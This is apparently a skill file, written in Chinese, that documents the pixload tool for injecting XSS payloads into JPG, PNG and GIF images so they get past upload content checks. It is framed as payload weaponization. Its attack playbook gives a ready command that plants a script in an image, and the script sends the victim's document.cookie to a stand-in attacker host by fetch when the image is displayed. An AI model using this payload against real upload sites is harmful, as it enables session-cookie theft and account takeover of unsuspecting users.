---
name: pixload-image-payload
description: Pixload: 图片上传 XSS/内容检查绕过。信号:载荷开发,武器化,PNG 注入,GIF 注入。
---

# Pixload

- 攻击大类:C07 载荷开发与武器化
- 上游仓库:https://github.com/chinarulezzz/pixload
- 上游 License:WTFPL(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/chinarulezzz/pixload && cd pixload && make
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./pixload-jpg payload.jpg` | JPG 注入 payload |
| `./pixload-png out.png` | PNG 注入 |
| `./pixload-gif out.gif` | GIF 注入 |
| `-x 'alert(1)'` | 自定义 JS payload |

## 攻击场景 Playbook

### 图片上传 XSS/内容检查绕过

```bash
./pixload-jpg photo.jpg -x '<script>fetch("//attacker/?c="+document.cookie)</script>'
# 上传到目标后,图片被直接展示时触发 XSS
```

## 注意事项

向图片二进制注入 payload 且不破环图片可显示性;用于绕过上传内容检测与被动 XSS。
